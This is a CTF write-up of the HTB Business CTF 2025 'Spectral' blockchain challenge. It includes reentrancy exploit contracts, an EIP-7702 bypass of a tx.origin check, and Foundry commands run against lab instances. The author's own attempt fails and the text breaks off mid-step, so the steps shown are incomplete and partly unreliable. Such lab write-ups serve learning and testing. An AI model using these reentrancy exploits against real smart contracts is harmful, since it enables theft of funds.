---
title: "Business HTB CTF 2025 - Spectral"
date: 2025-06-09
excerpt: "A detailed writeup of the Business HTB CTF 2025 Spectral challenge, covering Smart Contracts, Reentrancy attacks, and EIP-7702."
category: [CTF, Blockchain]
tags: [HTB, Smart Contract, Solidity, Foundry, EIP-7702]
---

## Key Lesson

- **Smart Contract**
    - Understanding about EIP-7702 (PRIORITY)
    - How to compile solidity file
- **Foundry**
    - Call Function
    - Sign Transaction (Add the other's EOA to the player's EOA)
    - Send Transaction (Register Gateway, Deposit Player's ETH Quota, and Deliver Gateway)


# TLDR
Just jump into Learn from another writeup (Spectral) and ignore the debugging option, since i did not manage to solve this ctf challenge.

# Setup.sol (Spectral)
in **isSolved()** function, we need to make sure that the control unit is run in **"Emergency Mode"** which indicate by **3** so it will returns **true**.
```solidity
function isSolved() public view returns (bool) {
        uint8 CU_STATUS_EMERGENCY = 3;
        (uint8 status, , , ) = TARGET.controlUnit();
        return status == CU_STATUS_EMERGENCY;
    }
```

# VCNK.sol (Spectral)

## Source Code Explanation

### Constant (Spectral)
```solidity
uint8 constant CU_STATUS_IDLE = 1;
  uint8 constant CU_STATUS_DELIVERING = 2;
  uint8 constant CU_STATUS_EMERGENCY = 3;
  uint8 constant GATEWAY_STATUS_UNKNOWN = 0;
  uint8 constant GATEWAY_STATUS_IDLE = 1;
  uint8 constant GATEWAY_STATUS_ACTIVE = 2;
  uint8 constant MAX_GATEWAYS = 5;
  uint256 constant MAX_CAPACITY = 100 ether;
  uint256 constant MAX_ALLOWANCE_PER_GATEWAY = 10 ether;
  uint256 constant GATEWAY_REGISTRATION_FEE = 20 ether;
  uint256 constant FAILSAFE_THRESHOLD = 10 ether;

```

### Struct (Spectral)
There is Control Unit  and Gateway which consist of these variables
```solidity
struct ControlUnit {
    uint8 status;
    uint256 registeredGateways;
    uint256 currentCapacity;
    uint256 allocatedAllowance;
  }
  
  struct Gateway {
    uint8 status;
    uint256 quota;
    uint256 totalUsage;
  }
```
### Events (Spectral)
There are five events that we must do to trigger the emergency mode
```solidity
1. Gateaway Registered
2. Gateway Quota Increase
3. Power Delivery Request
4. Power Delivery Success
5. Triggering Emergency Mode
```

```solidity
event GatewayRegistered(address indexed gateway);
  event GatewayQuotaIncrease(address indexed gateway, uint256 quotaAmount);
  event PowerDeliveryRequest(address indexed gateway, uint256 powerAmount);
  event PowerDeliverySuccess(address indexed gateway, uint256 powerAmount);
  event ControlUnitEmergencyModeActivated();
```
### circuitBreaker (Spectral)
This function compares msg.sender and tx.origin and it is indeed EOA (Externally Owned Account) since tx.origin is guaranteed EOA. If msg.sender and tx.origin are different, **"Illegal reentrant"** error will be triggered. This concludes that msg.sender and tx.origin **must be equal** to perform the transaction.

### Starting Point (Spectral)
- controlUnit.status in this case is **Idle Mode** which indicated by **1**
- controlUnit.currentCapacity is equal to **100 ether**
- controlUnit.allocatedAllowance is equal to **0**

### registerGateway() (Spectral)
This function will check:
- Registered Gateways is **less than** maximum gateaway, in this context is **5**. If more than **5**, it will trigger **"Maximum Number of Registered Gateaways"**
- In order to be registered as a gateaway, msg.value **must equal to** Gateaway Registration Fee, in this case **20 ether**. If we have not registered the gateaway before, **this scenario is triggered** and it will **update the gateaway** which is already been registered. 
	- For example, from 0 to 1 incrementally which indicated by this function:
		- controlUnit.registeredGateaways +=1
- Gateaway Status will change from **"Unknown Mode"** which indicated by **0** to **Idle Mode** which indicated by **1**. If you used the same contract  to register the gateaway which is already completed the registration process it will trigger the message "**Gateaway is already registered**"

### requestPowerDelivery() (Spectral)
This function will check:
- Gateaway Status must be in **"Idle Mode"** .
- The amount must more than 0
- Verifies the amount must less or equal than Gateaway Quota (**<=10**) to perform delivery.
- Sets Control Unit Status to **"Delivering Mode"** indicated by **2** during delivery process.
	- As the consequences, Control Unit Current Capacity is reduced
- Substracts the amount from control's unit currentUnit Capacity before calling deliverEnergy()
- Calls deliverEnergy to the receiver (player address?) with the provided amount which returns either **true or false**
- Gateaway Total Usage **will increase** after delivery
- it will **resets the current capacity back to the Starting Point** in this case is **100 ether** after delivery complete
- Finally. Power Delivery is successfully sent to the receiver (player address?) with the provided amount

### failSaveMonitor (Spectral)
failSafeMonitor function will trigger: 
- If current capacity is less or equal than failsafe threshold in this case **<= 10 ether**
- Control Unit Status is equal to "Emergency" which is **3** in order to trigger the "**Emergency Mode**"
  
## Source Code Review (Spectral)
After analyzing the source code, the vulnerable code appears to be this line which is vulnerable to reentrancy attacks
```solidity
vcnkCompatibleReceiver(_receiver).deliverEnergy(_amount);
gateway.totalUsage += _amount;
```

Explanation about reentrancy attacks
Link:
https://www.cyfrin.io/blog/what-is-a-reentrancy-attack-solidity-smart-contracts
https://owasp.org/www-project-smart-contract-top-10/2025/en/src/SC05-reentrancy-attacks.html
```solidity
From OWASP:
A reentrancy attack exploits the vulnerability in smart contracts when a function makes an external call to another contract before updating its own state. This allows the external contract, possibly malicious, to reenter the original function and repeat certain actions, like withdrawals, using the same state. Through such attacks, an attacker can possibly drain all the funds from a contract.

From Cyrfin:
In the context of Solidity smart contracts, a reentrancy attack is when the execution flow is transferred to an external contract, usually via an external call (e.g. a “fallback” function or “onERC721Received’), allowing the function (or another function) to be called recursively.
```

This code is using external call which means it can recursively call **requestPowerDelivery()** again before updating the **gateway.totalUsage**. The impact for this vulnerability is attacker can drain the power multiple time in single transaction.
```solidity
vcnkCompatibleReceiver(_receiver).deliverEnergy(_amount);
```

# Exploit.sol (Spectral)
## Credential Information (Spectral)
```#!/bin/bash
RPC URL: http://94.237.58.46:37127/

┌──(kali㉿kali)-[~]
└─$ nc 94.237.58.46 52850
1 - Get connection information
2 - Restart instance
3 - Get flag
Select action (enter number): 1
[*] Found node running. Retrieving connection informations...

Player Private Key : 0xca96ad2deb164837907a2933b769c7eaf5bf8dcf9fd71c8e8895351ca6a61a3a
Player Address     : 0xdFaEed2385633f2A7BDcEA6F5E92d303c68D82af
Target contract    : 0x655718eDe7d8E38F3e3c6f4DfEeDAebe504668A1
Setup contract     : 0x92F3CbF39538927aeFAC50F76df673a8B2164f26
```


Initial Balance is 50 ETH
```#!/bin/bash
┌──(kali㉿kali)-[~]
└─$ cast balance 0xdFaEed2385633f2A7BDcEA6F5E92d303c68D82af -r http://94.237.58.46:37127/
50000000000000000000

```

## Compile & Deploy Exploit.sol (Spectral)
```soldiity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./VCNK.sol";

contract Exploit is vcnkCompatibleReceiver{
    VCNK public vcnk;
    uint256 public reentryCount;

    constructor(address _target) payable {
        vcnk = VCNK(_target);
    }

    // Step 1: Register as a gateaway
    function register() external payable {
        vcnk.registerGateway{value: 20 ether}(address(this));
    }

    // Step 2: Increase or Deposit Quota (max 10 ether)
    function deposit() external payable {
        vcnk.requestQuotaIncrease{value: 10 ether}(address(this));
    }

    // Step 3: Trigger Reentrancy Loop
    function reentrancy() external {
        vcnk.requestPowerDelivery(10 ether, address(this));
    }

    // Step 4: Reenterancy again to drain capacity
    function deliverEnergy(uint256 amount) external override returns (bool) {
        if (reentryCount < 9) {
            reentryCount += 1;
            // request again before currentCapacity is reset to 100 ether
            vcnk.requestPowerDelivery(amount, address(this));
        }
        return true;
    }

    // Step 5: Trigger Fail Safe Monitor to activate Emergency Mode
    function triggerFailSafe() external {
        vcnk.requestQuotaIncrease{value: 1 ether}(address(this));
    }

    receive() external payable {}
}
```

Lets compile and deploy to get the exploit contract
```#!/bin/bash
┌──(kali㉿kali)-[~/…/business_ctf_2025/spectral/blockchain-spectral/src]
└─$ forge create /home/kali/ctf/blockchain/business_ctf_2025/spectral/blockchain-spectral/src/exploit.sol:Exploit --broadcast -r http://94.237.58.46:37127/ --private-key 0xca96ad2deb164837907a2933b769c7eaf5bf8dcf9fd71c8e8895351ca6a61a3a --constructor-args 0x655718eDe7d8E38F3e3c6f4DfEeDAebe504668A1
[⠊] Compiling...
[⠒] Compiling 1 files with Solc 0.8.29
[⠢] Solc 0.8.29 finished in 60.63ms
Compiler run successful!
Deployer: 0xdFaEed2385633f2A7BDcEA6F5E92d303c68D82af
Deployed to: 0x6F19caE64B764D5eB10c7c67BB399cE041fca56f
Transaction hash: 0x30f8dc3fcad5007c3b59557c7b74fdca0c0660eb1b462ab12151f3c3f4cfe6e0
```


The exploit contract is 
```#!/bin/bash
0x6F19caE64B764D5eB10c7c67BB399cE041fca56f
```

## Checking Balance & Confirm Ownership (Spectral)
Deploying Contract costs gas, now we have 49 ETH
```#!/bin/bash
┌──(kali㉿kali)-[~]
└─$ cast balance 0xdFaEed2385633f2A7BDcEA6F5E92d303c68D82af -r http://94.237.58.46:37127/
49999527235000000000
```


## Register Gateway (Spectral)
Registration Fee is 20 ether, we can do that by using cast send
```#!/bin/bash
cast send -r http://94.237.58.46:37127/ --private-key 0xca96ad2deb164837907a2933b769c7eaf5bf8dcf9fd71c8e8895351ca6a61a3a --value 20ether 0x6F19caE64B764D5eB10c7c67BB399cE041fca56f "register()"
```
## Funding Ether (Spectral)
Lets pay the registration fee and deposit ether in 30 ether with cast send by using player's private key
```#!/bin/bash
┌──(kali㉿kali)-[~/…/business_ctf_2025/spectral/blockchain-spectral/src]
└─$ cast send 0xF0A5317b1B20D3Bd0dc826c63ccD0EAB43EA23Fb -r http://94.237.58.46:37127/ --private-key 0x92a49ce29101b27c8129f71ff227a6f2ca42c5fdfdfecbc946e50fd9138565ed --value 30ether

blockHash            0x49eb5f699600f38a2124670f945e3db12cdc77d5f9d4c21a6373f55fa914c5a8
blockNumber          3
contractAddress      
cumulativeGasUsed    21055
effectiveGasPrice    1000000000
from                 0xf23aBba9a375c5bDaec6Ed509bF92e837484E08C
gasUsed              21055
logs                 []
logsBloom            0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
root                 
status               1 (success)
transactionHash      0x3c37586290f3d3bed4e0f9e823701f159753102407d6699d911039c14e243d42
transactionIndex     0
type                 2
blobGasPrice         1
blobGasUsed          
to                   0xF0A5317b1B20D3Bd0dc826c63ccD0EAB43EA23Fb
```

## Reentrancy Attack (Spectral)
```#!/bin/bash
cast send 0xF0A5317b1B20D3Bd0dc826c63ccD0EAB43EA23Fb -r http://94.237.58.46:37127/ --private-key 0x92a49ce29101b27c8129f71ff227a6f2ca42c5fdfdfecbc946e50fd9138565ed "solveVCNK()" 
```

## Verifying Solve Status (Spectral)
```#!/bin/bash
cast call -r http://94.237.61.250:46902/ "isSolved()" 0x9303f59C132282086CBB4FDf0AAcba533a9B9122
```

## Reentrancy Attacks (Spectral, Debugging)
Lets begin with sending the transaction in solveVCNK() function
```#!/bin/bash
┌──(kali㉿kali)-[~/…/business_ctf_2025/spectral/blockchain-spectral/src]
└─$ cast send -r http://94.237.61.250:46902/ --private-key 0x243b05bece6360fbb8ddec2c279442a7549c43415351be29fcc54eff42772171 "solveVCNK()" 0xF9995b889d07d4D35fE9E1a6BaFF8Ee8AA944E24
error: invalid value 'solveVCNK()' for '[TO]': odd number of digits
```


We need to provide value of these solveVCNK() and put the exploit address after cast send like this one
```#!/bin/bash
cast send 0xF9995b889d07d4D35fE9E1a6BaFF8Ee8AA944E24 -r http://94.237.61.250:46902/ --private-key 0x243b05bece6360fbb8ddec2c279442a7549c43415351be29fcc54eff42772171 --value 30ether "solveVCNK()" 
```

The error now changes to Insufficicent funds
```#!/bin/bash
┌──(kali㉿kali)-[~/…/business_ctf_2025/spectral/blockchain-spectral/src]
└─$ cast send 0xAF6d2b32D208A63217ce84D857A80c18c9F66b49 "solveVCNK()" -r http://94.237.61.250:46902/ --private-key 0xc57da0a64d233dc155312eb8d1ea9fa25cd6565355276d015b2b63de986732c0  
Error: Failed to estimate gas: server returned an error response: error code -32003: Insufficient funds for gas * price + value
```


Lets check the balance using **cast balance**
Our balance is 19 ETH which is why got the error of Insufficient Funds
```#!/bin/bash
┌──(kali㉿kali)-[~/…/business_ctf_2025/spectral/blockchain-spectral/src]
└─$ cast balance 0x98fb1F1739B2c7BA19DEC7944D7471D1D8993ECB -r http://94.237.61.250:46902/
19999420238000000000
```


# After Party (Spectral)
Since i didn't managed to successfully solved this challenge, I need to understand about **EIP-7702** first in order to solve this challenge, according from **kiinzu** and **s0** in HTB Discord.
Title : **EIP-7702: Set EOA account code**
1. in `foundry.toml` we can see the `evm_version` is set to `prague` (in this version, exist EIP-7702) [https://mixbytes.io/blog/the-prague-electra-pectra-hardfork-explained](https://mixbytes.io/blog/the-prague-electra-pectra-hardfork-explained "https://mixbytes.io/blog/the-prague-electra-pectra-hardfork-explained"),
2. `tx.origin == msg.sender` before `prague` can be used to prevent reentrancy, however the EIP-7702 (again in the evm version prague), introduce a way to bypass that checks (This is what I read during the ctf, [https://www.certik.com/resources/blog/pectras-eip-7702-redefining-trust-assumptions-of-externally-owned-accounts](https://www.certik.com/resources/blog/pectras-eip-7702-redefining-trust-assumptions-of-externally-owned-accounts "https://www.certik.com/resources/blog/pectras-eip-7702-redefining-trust-assumptions-of-externally-owned-accounts"))
3. From the attached foundry.toml, `evm_version = "prague"` [https://soliditylang.org/blog/2025/05/07/solidity-0.8.30-release-announcement/](https://soliditylang.org/blog/2025/05/07/solidity-0.8.30-release-announcement/ "https://soliditylang.org/blog/2025/05/07/solidity-0.8.30-release-announcement/").

Key note to take here
```#!/bin/bash
One particularly alarming case involved a function that relied on the condition `tx.origin == msg.sender`, a pattern we've occasionally seen in smart contracts that assume that EOAs cannot execute smart contract code. While this assumption previously held true, EIP-7702 fundamentally changes that trust assumption.
```
## Initial Analysis (foundry.toml, Spectral)
Foundry.toml evm version appears to be **prague**, indicating the challenge use a testnet or local environment simulating the ethereum [Pectra](https://ethereum.org/en/roadmap/pectra/) hardfork. One relevant change from this case is  [EIP-7702](https://eips.ethereum.org/EIPS/eip-7702), allowing EOA to temporarily act like smart contract by attaching custom code from the attacker.
```#!/bin/bash
┌──(kali㉿kali)-[~/…/blockchain/business_ctf_2025/spectral/blockchain-spectral]
└─$ cat foundry.toml  
[profile.default]
src = "src"
out = "out"
libs = ["lib"]
evm_version = "prague"

# See more config options https://github.com/foundry-rs/foundry/blob/master/crates/config/README.md#all-options
```

## Setup.sol Full Code (Spectral)
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.29;

import { VCNK } from "./VCNK.sol";

contract Setup {
    VCNK public TARGET;

    event DeployedTarget(address at);

    constructor() {
        TARGET = new VCNK();
        emit DeployedTarget(address(TARGET));
    }

    function isSolved() public view returns (bool) {
        uint8 CU_STATUS_EMERGENCY = 3;
        (uint8 status, , , ) = TARGET.controlUnit();
        return status == CU_STATUS_EMERGENCY;
    }
}
```

## VCNK.sol Full Code (Spectral)
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.29;

/*
  _   __     __                      _____         __           ___            __  _  __         __               __ __                 __
 | | / /__  / /__  ___ ___ _____ _  / ___/__ ___  / /________ _/ (_)__ ___ ___/ / / |/ /_ ______/ /__ ___ _____  / //_/__ _______  ___ / /
 | |/ / _ \/ / _ \/ _ `/ // / _ `/ / /__/ -_) _ \/ __/ __/ _ `/ / /_ // -_) _  / /    / // / __/ / -_) _ `/ __/ / ,< / -_) __/ _ \/ -_) / 
 |___/\___/_/_//_/\_,_/\_, /\_,_/  \___/\__/_//_/\__/_/  \_,_/_/_//__/\__/\_,_/ /_/|_/\_,_/\__/_/\__/\_,_/_/   /_/|_|\__/_/ /_//_/\__/_/  
                      /___/                                                                                                               
                                                      Volnaya Centralized Nuclear Kernel
*/

interface vcnkCompatibleReceiver {
  function deliverEnergy(uint256 amount) external returns (bool);
}

contract VCNK {
  ControlUnit public controlUnit;
  mapping(address => Gateway) public gateways;

  uint8 constant CU_STATUS_IDLE = 1;
  uint8 constant CU_STATUS_DELIVERING = 2;
  uint8 constant CU_STATUS_EMERGENCY = 3;
  uint8 constant GATEWAY_STATUS_UNKNOWN = 0;
  uint8 constant GATEWAY_STATUS_IDLE = 1;
  uint8 constant GATEWAY_STATUS_ACTIVE = 2;
  uint8 constant MAX_GATEWAYS = 5;
  uint256 constant MAX_CAPACITY = 100 ether;
  uint256 constant MAX_ALLOWANCE_PER_GATEWAY = 10 ether;
  uint256 constant GATEWAY_REGISTRATION_FEE = 20 ether;
  uint256 constant FAILSAFE_THRESHOLD = 10 ether;

  struct ControlUnit {
    uint8 status;
    uint256 registeredGateways;
    uint256 currentCapacity;
    uint256 allocatedAllowance;
  }
  
  struct Gateway {
    uint8 status;
    uint256 quota;
    uint256 totalUsage;
  }

  event GatewayRegistered(address indexed gateway);
  event GatewayQuotaIncrease(address indexed gateway, uint256 quotaAmount);
  event PowerDeliveryRequest(address indexed gateway, uint256 powerAmount);
  event PowerDeliverySuccess(address indexed gateway, uint256 powerAmount);
  event ControlUnitEmergencyModeActivated();

  modifier failSafeMonitor() {
    if (controlUnit.currentCapacity <= FAILSAFE_THRESHOLD) {
      controlUnit.status = CU_STATUS_EMERGENCY;
      emit ControlUnitEmergencyModeActivated();
    }
    else {
      _;
    }
  }

  modifier circuitBreaker() {
    require(msg.sender == tx.origin, "[VCNK] Illegal reentrant power delivery request detected.");
    _;
  }

  constructor() {
    controlUnit.status = CU_STATUS_IDLE;
    controlUnit.currentCapacity = MAX_CAPACITY;
    controlUnit.allocatedAllowance = 0;
  }

  function registerGateway(address _gateway) external payable circuitBreaker failSafeMonitor {
    require(
      controlUnit.registeredGateways < MAX_GATEWAYS,
      "[VCNK] Maximum number of registered gateways reached. Infrastructure will be scaled up soon, sorry for the inconvenience."
    );
    require(msg.value == GATEWAY_REGISTRATION_FEE, "[VCNK] Registration fee must be 20 ether.");
    Gateway storage gateway = gateways[_gateway];
    require(gateway.status == GATEWAY_STATUS_UNKNOWN, "[VCNK] Gateway is already registered.");
    gateway.status = GATEWAY_STATUS_IDLE;
    gateway.quota = 0;
    gateway.totalUsage = 0;
    controlUnit.registeredGateways += 1;
    emit GatewayRegistered(_gateway);
  }

  function requestQuotaIncrease(address _gateway) external payable circuitBreaker failSafeMonitor {
    require(msg.value > 0, "[VCNK] Deposit must be greater than 0.");
    Gateway storage gateway = gateways[_gateway];
    require(gateway.status != GATEWAY_STATUS_UNKNOWN, "[VCNK] Gateway is not registered.");
    uint256 currentQuota = gateway.quota;
    require(currentQuota + msg.value <= MAX_ALLOWANCE_PER_GATEWAY, "[VCNK] Requested quota exceeds maximum allowance per gateway.");
    gateway.quota += msg.value;
    controlUnit.allocatedAllowance += msg.value;
    emit GatewayQuotaIncrease(_gateway, msg.value);
  }

  function requestPowerDelivery(uint256 _amount, address _receiver) external circuitBreaker failSafeMonitor {
    Gateway storage gateway = gateways[_receiver];
    require(gateway.status == GATEWAY_STATUS_IDLE, "[VCNK] Gateway is not in a valid state for power delivery.");
    require(_amount > 0, "[VCNK] Requested power must be greater than 0.");
    require(_amount <= gateway.quota, "[VCNK] Insufficient quota.");
    
    emit PowerDeliveryRequest(_receiver, _amount);
    controlUnit.status = CU_STATUS_DELIVERING;
    controlUnit.currentCapacity -= _amount;

    vcnkCompatibleReceiver(_receiver).deliverEnergy(_amount);
    gateway.totalUsage += _amount;

    controlUnit.currentCapacity = MAX_CAPACITY;
    emit PowerDeliverySuccess(_receiver, _amount);
  }
}
```

## Solve (Spectral, Debugging)

### Exploit.sol (Spectral, Debugging)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.29;

import {VCNK, vcnkCompatibleReceiver} from "../src/VCNK.sol";

contract Exploit is vcnkCompatibleReceiver{
    VCNK public target;
    uint256 public reentryCount;
    address public owner;

    constructor(address _target){
        // Match According to EIP-7720
        owner = msg.sender;
        target = VCNK(_target);
    }

    // Step 1: Register as a gateaway
    function register() external {
        target.registerGateway{value: 20 ether}(address(this));
    }

    // Step 2: Increase or Deposit Quota (max 10 ether)
    function deposit() external {
        target.requestQuotaIncrease{value: 10 ether}(address(this));
    }

    // Step 3 : Initialize Player's EOA Code
    function initialize(address _target) public {
        owner = msg.sender;
        target = VCNK(_target);
    }

    // Step 4: Trigger Reentrancy Attack
    function exploit() external {
        target.requestPowerDelivery(10 ether, address(this));
    }

    // Step 5: Reenterancy again to drain capacity
    function deliverEnergy(uint256 amount) external override returns (bool) {
        reentryCount++;
        if (reentryCount < 10) {
            // request again before currentCapacity is reset to 100 ether
            target.requestPowerDelivery(amount, address(this));
        }
        return true;
    }

    receive() external payable {}
}
```

### Deploy Exploit Contract (Spectral, Debugging)
Credentials Information
```#!/bin/bash
RPC URL: http://94.237.60.161:34290

┌──(kali㉿kali)-[~/…/blockchain/business_ctf_2025/spectral/blockchain-spectral]
└─$ nc 94.237.60.161 48806
1 - Get connection information
2 - Restart instance
3 - Get flag
Select action (enter number): 1
[*] No running node found. Launching new node...

Player Private Key : 0xcaa08db5044d2cc61ece7b42416a3ecc7ca21061dda2b3123fec180b243d289b
Player Address     : 0xdd812a3604219c83e44920402cAF02C2544409BC
Target contract    : 0xFFFa1bb6A0A1d011EF05870eA8A8141EDA21b6D1
Setup contract     : 0xE9861dc5c7255F93615D7A16770265F38477AfF1

Lets add it to environment variable
┌──(kali㉿kali)-[~/…/blockchain/business_ctf_2025/spectral/blockchain-spectral]
└─$ export PK=0xcaa08db5044d2cc61ece7b42416a3ecc7ca21061dda2b3123fec180b243d289b
        
┌──(kali㉿kali)-[~/…/blockchain/business_ctf_2025/spectral/blockchain-spectral]
└─$ export PLAYER=0xdd812a3604219c83e44920402cAF02C2544409BC                    

┌──(kali㉿kali)-[~/…/blockchain/business_ctf_2025/spectral/blockchain-spectral]
└─$ export TARGET=0xFFFa1bb6A0A1d011EF05870eA8A8141EDA21b6D1
        
┌──(kali㉿kali)-[~/…/blockchain/business_ctf_2025/spectral/blockchain-spectral]
└─$ export SETUP=0xE9861dc5c7255F93615D7A16770265F38477AfF1 
        
┌──(kali㉿kali)-[~/…/blockchain/business_ctf_2025/spectral/blockchain-spectral]
└─$ export RPC=http://94.237.60.161:34290
```

Lets initialize the project with forge command
```#!/bin/bash
# Unzipped Challenge, place exploit.sol in ./src directory
# Initialize foundry project with forge command

┌──(kali㉿kali)-[~/…/blockchain/business_ctf_2025/spectral/blockchain-spectral]
└─$ forge init --force         
Warning: Target directory is not empty, but `--force` was specified
Initializing /home/kali/ctf/blockchain/business_ctf_2025/spectral/blockchain-spectral...
Installing forge-std in /home/kali/ctf/blockchain/business_ctf_2025/spectral/blockchain-spectral/lib/forge-std (url: Some("https://github.com/foundry-rs/forge-std"), tag: None)
Cloning into '/home/kali/ctf/blockchain/business_ctf_2025/spectral/blockchain-spectral/lib/forge-std'...
remote: Enumerating objects: 2117, done.
remote: Counting objects: 100% (1048/1048), done.
remote: Compressing objects: 100% (152/152), done.
remote: Total 2117 (delta 960), reused 908 (delta 896), pack-reused 1069 (from 1)
Receiving objects: 100% (2117/2117), 682.08 KiB | 4.77 MiB/s, done.
Resolving deltas: 100% (1436/1436), done.
    Installed forge-std v1.9.7
    Initialized forge projec

# Deploy Exploit.sol
┌──(kali㉿kali)-[~/…/blockchain/business_ctf_2025/spectral/blockchain-spectral]
└─$ forge create --rpc-url $RPC --private-key $PK --broadcast src/exploit.sol:Exploit --constructor-args $TARGET
[⠊] Compiling...
[⠢] Compiling 1 files with Solc 0.8.29
[⠆] Solc 0.8.29 finished in 90.43ms
Compiler run successful!
Deployer: 0xdd812a3604219c83e44920402cAF02C2544409BC
Deployed to: 0x4f3F140A7b0D362C85DecBfa423a9E5afA48463b
Transaction hash: 0x1c3cf4636e8b17f9b91bd46782a598f06e4e646b8982a1e5de66f773d74395aa

# Export Exploit.sol as environment variable
┌──(kali㉿kali)-[~/…/blockchain/business_ctf_2025/spectral/blockchain-spectral]
└─$ export EXPLOIT=0x4f3F140A7b0D362C85DecBfa423a9E5afA48463b
```

### Register Player's EOA as a Gateway (Spectral, Debugging)
Cannot Register the contract
```#!/bin/bash
┌──(kali㉿kali)-[~/…/blockchain/business_ctf_2025/spectral/blockchain-spectral]
└─$ cast send $EXPLOIT "register()" $PLAYER --value 20ether --rpc-url $RPC --private-key $PK
Error: Failed to estimate gas: server returned an error response: error code 3: execution reverted, data: "0x"
      
┌──(kali㉿kali)-[~/…/blockchain/business_ctf_2025/spectral/blockchain-spectral]
└─$ cast send $EXPLOIT "registerGateway(address)" $PLAYER --value 20ether --rpc-url $RPC --private-key $PK
Error: Failed to estimate gas: server returned an error response: error code 3: execution reverted, data: "0x"
       
┌──(kali㉿kali)-[~/…/blockchain/business_ctf_2025/spectral/blockchain-spectral]
└─$ cast send $EXPLOIT "register(address)" $PLAYER --value 20ether --rpc-url $RPC --private-key $PK 
Error: Failed to estimate gas: server returned an error response: error code 3: execution reverted, data: "0x"

┌──(kali㉿kali)-[~/…/blockchain/business_ctf_2025/spectral/blockchain-spectral]
└─$ cast send $EXPLOIT "deposit()" $PLAYER --value 20ether --rpc-url $RPC --private-key $PK       
Error: Failed to estimate gas: server returned an error response: error code 3: execution reverted, data: "0x"
```

## Learn from Another Writeup (Spectral)
Write up for solve this challenge (thanks to 0x1uke):
https://0x1uke.com/posts/HTBBusinessCTF2025BlockchainSpectralChallenge/

#description

```#!/bin/bash
Objective: 
Deploy a contract with a malicious implementation of `deliverEnergy()` that conducts a reentrancy attack by recursively calling `requestPowerDelivery()` to drain `VCNK.sol` `controlUnit`’s `MAX_CAPACITY` to or below 10 ETH, triggering `failSafeMonitor()` and updating `VCNK.sol`’s `controlUnit` status to `CU_STATUS_EMERGENCY`.

The attack path for this exploit is:
- Write Exploit contract which implements deliverEnergy() function and has a malicious function which triggers reentrancy attack against VCNK.sol
- Deploy Exploit Contract
- Register Player's EOA as a Gateway
- Deposit Player's EOA Gateway quota to be set to 10 ETH.
- Add the other's EOA to the player's EOA in exploit's contract code
- Initialize Player's EOA Code
- Call the exploit() function to trigger Reentrancy Attack
- Confirm VCNK.sol's control unit status is `CU_STATUS_EMERGENCY`
- Get the Flag
```

### Exploit.sol (Spectral)
After further analysis regarding the error from debugging
- It seems that we need to remove the **register()** and **deposit()** function so it will reduce the gas fee we need to deploy plus we can call that function directly in VCNK.sol.
- It seems that during looping the **reentryCount** in **deliverEnergy()** function
	-  Make sure `target.requestPowerDelivery(10 ether, address(this));` looks the same as the `exploit()` function if **reentryCount** is less than **< 10**.
Key Note:
- **initialize()** is executed to populate player's EOA storage with Exploit.sol's variables after its code is added to player's EOA
- **exploit()** initiates reentrancy attack by sending initial requestPowerDelivery() function to call VCNK.sol requesting 10 ETH which then calls Exploit.sol's deliverEnergy() implementation
- **deliverEnergy()** implements the `vcnkCompatibleReceiver` interface and continues a loop started by `exploit()` by calling `VCNK.sol`’s `requestPowerDelivery()` function again requesting 10 ETH which calls `Exploit.sol`’s `deliverEnergy()` and so on until `VCNK.sol`’s `MAXIMUM_CAPACITY` falls below the `FAILSAFE_THRESHOLD` triggering `failSafeMonitor()` completing the reentrancy attack and setting `VCNK.sol`’s `controlUnit` status to `CU_STATUS_EMERGENCY`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.29;

import {VCNK, vcnkCompatibleReceiver} from "./VCNK.sol";

contract Exploit is vcnkCompatibleReceiver{
    VCNK public target;
    uint256 public reentryCount;
    address public owner;

    constructor(address _target){
        // Match According to EIP-7720
        owner = msg.sender;
        target = VCNK(_target);
    }

    // Step 1 : Initialize Player's EOA Code
    function initialize(address _target) public {
        owner = msg.sender;
        target = VCNK(_target);
    }

    // Step 2: Trigger Reentrancy Loop
    function exploit() external {
        target.requestPowerDelivery(10 ether, address(this));
    }

    // Step 3: Reenterancy again to drain capacity
    function deliverEnergy(uint256 amount) external override returns (bool) {
        reentryCount++;
        if (reentryCount < 10) {
            // request again before currentCapacity is reset to 100 ether
            target.requestPowerDelivery(10 ether, address(this));
        }
        return true;
    }

    receive() external payable {}
}
```

### Deploy Exploit Contract (Spectral)
Credentials Information
```#!/bin/bash
RPC URL: http://94.237.60.161:34290

┌──(kali㉿kali)-[~/…/blockchain/business_ctf_2025/spectral/blockchain-spectral]
└─$ nc 94.237.60.161 48806
1 - Get connection information
2 - Restart instance
3 - Get flag
Select action (enter number): 1
[*] Found node running. Retrieving connection informations...

Player Private Key : 0xabed756c838126c8262c247f304abe4c353fd73ca3e2f9a331f4c406fe5c5a8d
Player Address     : 0xe9d025CbA085Eba172AF7a30a5f0bF2988d48987
Target contract    : 0x07C85180a2744920B62B246150BF828CeF903e54
Setup contract     : 0x7376145097bb4CC428B2C4c3F9a78b46C90a9E0A

# Lets add it to environment variable
┌──(kali㉿kali)-[~/…/blockchain/business_ctf_2025/spectral/blockchain-spectral]
└─$ export PK=0xabed756c838126c8262c247f304abe4c353fd73ca3e2f9a331f4c406fe5c5a8d
       
┌──(kali㉿kali)-[~/…/blockchain/business_ctf_2025/spectral/blockchain-spectral]
└─$ export PLAYER=0xe9d025CbA085Eba172AF7a30a5f0bF2988d48987 
     
┌──(kali㉿kali)-[~/…/blockchain/business_ctf_2025/spectral/blockchain-spectral]
└─$ export TARGET=0x07C85180a2744920B62B246150BF828CeF903e54
   
┌──(kali㉿kali)-[~/…/blockchain/business_ctf_2025/spectral/blockchain-spectral]
└─$ export SETUP=0x7376145097bb4CC428B2C4c3F9a78b46C90a9E0A
   
┌──(kali㉿kali)-[~/…/blockchain/business_ctf_2025/spectral/blockchain-spectral]
└─$ export RPC=http://94.237.60.161:34290
```

Lets initialize the project with forge command
```#!/bin/bash
# Unzipped Challenge, place exploit.sol in ./src directory
# Initialize foundry project with forge command

